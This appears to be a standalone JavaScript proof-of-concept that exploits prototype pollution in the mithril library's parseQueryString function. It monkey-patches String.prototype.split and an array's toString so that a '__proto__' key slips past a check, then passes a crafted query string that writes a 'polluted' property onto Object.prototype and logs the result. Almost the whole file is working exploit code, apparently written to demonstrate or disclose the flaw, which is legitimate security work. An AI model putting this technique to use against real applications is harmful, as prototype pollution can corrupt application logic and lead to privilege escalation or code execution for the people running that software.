var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
require('mithril/test-utils/browserMock')(global);
const m = require('mithril');
obj = {};
console.log({}.polluted);
m.parseQueryString('constructor%5Bprototype%5Bpolluted%5D=yes');
console.log({}.polluted);